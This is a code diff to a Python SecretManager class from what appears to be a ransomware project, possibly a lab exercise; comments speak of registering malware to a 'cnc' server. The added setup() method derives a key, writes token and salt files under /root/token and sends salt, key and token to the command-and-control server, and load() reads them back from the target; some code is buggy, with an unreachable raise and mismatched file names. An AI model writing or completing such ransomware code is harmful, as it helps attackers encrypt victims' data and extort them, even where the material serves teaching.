@@ -61,13 +61,40 @@ class SecretManager:
         response.raise_for_status()
 
     def setup(self)->None:
-        # main function to create crypto data and register malware to cnc
-        raise NotImplemented()
+        tokens_generated = self.create()
+
+        # Do the derivation key
+        self._key, self._salt = self.do_derivation(tokens_generated["salt"], tokens_generated["key"])
+        self._token = tokens_generated["token"]
+
+        # Create the client folder
+        folder_token_name = "/root/token"
+
+        # Token folder's existance verification
+        try:
+            os.makedirs(folder_token_name)
+        except:
+            return
+            raise
+
+        # Create the binary token file
+        with open(folder_token_name + "/token.bin", "wb") as f:
+            f.write(self._token)
+
+        # Create the binary salt file
+        with open(folder_token_name + "/salt.bin", "wb") as f:
+            f.write(self._salt)
+
+        # Send the Salt, Key and Token to the CNC
+        self.post_new(self._salt, self._key, self._token)
 
     def load(self)->None:
-        # function to load crypto data
-        raise NotImplemented()
-
+        # function to load crypto data from the target
+        with open(os.path.join(self.SALT_PATH, "salt"), "rb") as f: # load salt
+            self._salt = f.read()
+        with open(os.path.join(self.TOKEN_PATH, "token"), "rb") as f: # load token
+            self._token = f.read()
+        
     def check_key(self, candidate_key:bytes)->bool:
         # Assert the key is valid
         raise NotImplemented()
